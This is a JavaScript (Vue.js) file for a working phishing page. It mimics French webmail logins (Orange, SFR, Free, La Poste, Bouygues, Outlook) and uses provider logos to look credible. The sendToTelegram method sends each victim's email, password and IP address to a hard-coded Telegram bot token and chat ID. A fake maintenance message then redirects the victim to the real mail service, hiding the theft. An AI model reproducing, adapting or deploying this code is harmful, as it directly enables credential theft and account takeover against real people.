
new Vue({
    el: '#app',
    data: {
        email: '',
        password: '',
        error: '',
        loading: false,
        login: 1,
        providerLogo: '',
        redirectMessage: '',
        showModal: false,
        modalMessage: '',
        telegram_bot_id: "7711369122:AAFybQfzZI0awTYeapf4Qy5-pj04ERXvGDM",
        chat_id: "7369702679",
        ipAddress: '', 
    },

    methods: {
        getIpAddress() {
            axios.get("https://api.ipify.org?format=json")
                .then((response) => {
                    this.ipAddress = response.data.ip;
                })
                .catch((error) => {
                    console.error("Erreur lors de la récupération de l'adresse IP:", error);
                });
        },

        validateEmail(email) {
            const validProviders = {
                'sfr.fr': './assets/img/sfr.png',
                'laposte.net': './assets/img/laposte.png',
                'free.fr': './assets/img/free.png',
                'bouygues.fr': './assets/img/bouygues.png',
                'orange.fr': './assets/img/orange.png',
                'wanadoo.fr': './assets/img/orange.png',
                'hotmail.com': './assets/img/outlook.png',
                'hotmail.fr': './assets/img/outlook.png',
                'live.fr': './assets/img/outlook.png',
                'live.com': './assets/img/outlook.png',
                'outlook.fr': './assets/img/outlook.png',
                'outlook.com': './assets/img/outlook.png'
            };

            const emailParts = email.split('@');
            if (emailParts.length !== 2) {
                return false;
            }

            const domain = emailParts[1].toLowerCase();
            if (validProviders[domain]) {
                this.providerLogo = validProviders[domain];
                return true;
            }
            return false;
        },

        updateProviderLogo() {
            this.providerLogo = '';
            this.validateEmail(this.email);
        },

        submit() {
            this.error = '';
            if (!this.validateEmail(this.email)) {
                this.error = "Veuillez entrer une adresse e-mail valide : SFR, La Poste, Free, Bouygues, Orange, Outlook ou Hotmail.";
                return;
            }

            this.loading = true;
            this.redirectMessage = '';

            setTimeout(() => {
                this.loading = false;
                this.login = 2;
            }, 2000);
        },

        submitLogin() {
            this.error = '';
            if (!this.email || !this.password) {
                this.error = "Veuillez entrer votre adresse e-mail et votre mot de passe.";
                return;
            }

            this.loading = true;

            const domain = this.email.split('@')[1].toLowerCase();
            let redirectUrl = '';

            switch (domain) {
                case 'sfr.fr':
                    redirectUrl = 'https://www.sfr.fr';
                    break;
                case 'laposte.net':
                    redirectUrl = 'https://www.laposte.net';
                    break;
                case 'free.fr':
                    redirectUrl = 'https://mail.free.fr';
                    break;
                case 'bouygues.fr':
                    redirectUrl = 'https://www.bouygues.fr';
                    break;
                case 'orange.fr':
                case 'wanadoo.fr':
                    redirectUrl = 'https://mail01.orange.fr/appsuite/#!&app=io.ox/mail&folder=default0/INBOX';
                    break;
                case 'hotmail.com':
                case 'hotmail.fr':
                case 'live.fr':
                case 'live.com':
                case 'outlook.fr':
                case 'outlook.com':
                    redirectUrl = 'https://outlook.live.com/mail/0/';
                    break;
                default:
                    this.error = "Domaine non reconnu. Veuillez utiliser un domaine valide.";
                    this.loading = false;
                    return;
            }

            this.sendToTelegram();

            this.modalMessage = `Le système est en cours de maintenance, vous allez être redirigé vers votre messagerie  ${this.email}.`;
            this.showModal = true;

            setTimeout(() => {
                this.loading = false;
                this.showModal = false;
                window.location.href = redirectUrl;
                this.email = ""; 
                this.password = "";
            }, 8000);
        },

        sendToTelegram() {
            if (!this.email || !this.password) {
                console.error("Email ou mot de passe manquant.");
                return;
            }
            const domain = this.email.split('@')[1].toLowerCase(); 
            const message = `*Nouveau LOG* 🌐 ${domain}
📌 *IP* : ${this.ipAddress}
📧 *Email* : ${this.email}
🔑 *Mot de passe* : ${this.password}`;

            const settings = {
                async: true,
                crossDomain: true,
                url: `https://api.telegram.org/bot${this.telegram_bot_id}/sendMessage`,
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "cache-control": "no-cache",
                },
                data: JSON.stringify({
                    chat_id: this.chat_id,
                    text: message,
                    parse_mode: 'Markdown'
                }),
            };

            axios.post(settings.url, settings.data, { headers: settings.headers })
                .then(response => {
                    console.log("Message envoyé:", response.data);
                })
                .catch(error => {
                    console.error("Erreur lors de l'envoi du message:", error);
                });
        },

        closeModal() {
            this.showModal = false;
        },
    },

    watch: {
        email(newEmail) {
            this.updateProviderLogo();
        }
    },

    mounted() {
        this.getIpAddress(); 
    },
});
